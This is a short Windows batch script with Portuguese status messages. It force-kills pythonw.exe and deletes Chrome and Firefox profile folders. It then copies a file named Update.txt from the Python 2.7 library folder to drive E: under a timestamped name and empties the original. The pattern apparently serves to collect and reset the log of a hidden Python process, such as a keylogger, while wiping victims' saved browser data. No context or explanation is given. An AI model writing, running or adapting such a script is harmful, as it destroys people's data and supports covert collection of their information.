echo Executando...
taskkill -im pythonw.exe -f
del C:\Users\%USERNAME%\AppData\Local\Google
del C:\Users\%USERNAME%\AppData\Roaming\Google
del C:\Users\%USERNAME%\AppData\Roaming\Mozilla
del C:\Users\%USERNAME%\AppData\Local\Mozilla
echo Copiando arquivo...
C:
cd C:\Python27\Lib\
IF EXIST E: CALL :COPIAR_E
C:
cd C:\Python27\Lib\
copy NUL Update.txt
copy /b NUL Update.txt
echo Sucess!
pause

:COPIAR_E
	COPY Update.txt E:
	E:
	rename Update.txt update_%time:~0,2%%time:~3,2%%time:~6,2%_%date:~-10,2%%date:~-7,2%%date:~-4,4%.txt
	


